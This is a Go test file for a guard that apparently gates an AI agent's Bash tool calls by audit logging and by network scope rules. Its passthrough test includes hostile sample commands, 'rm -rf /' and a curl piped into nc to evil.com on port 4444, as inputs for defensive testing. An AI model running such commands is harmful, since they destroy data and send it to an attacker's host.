package guard

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/Autumn-27/norma/hook"
	"github.com/skilfoy/ARTEX-English/program"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

var _ = hook.PreToolUse

func TestScopeBlocksOutOfRangeTarget(t *testing.T) {
	scope, err := program.Parse([]byte(`{
		"default": "deny",
		"allow": [{"cidr": "10.16.0.0/24", "zone": "dmz"}],
		"names": [{"fqdn": "claims.northline.lab", "ip": "10.16.0.20"}]
	}`))
	if err != nil {
		t.Fatal(err)
	}
	g := New()
	g.SetScope(scope)
	blocked := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}
	if blocked("curl http://claims.northline.lab/") {
		t.Fatal("in-scope target was blocked")
	}
	if !blocked("curl http://10.17.0.20/") {
		t.Fatal("out-of-scope target was allowed")
	}
	if blocked("ls") {
		t.Fatal("local command was blocked")
	}
}
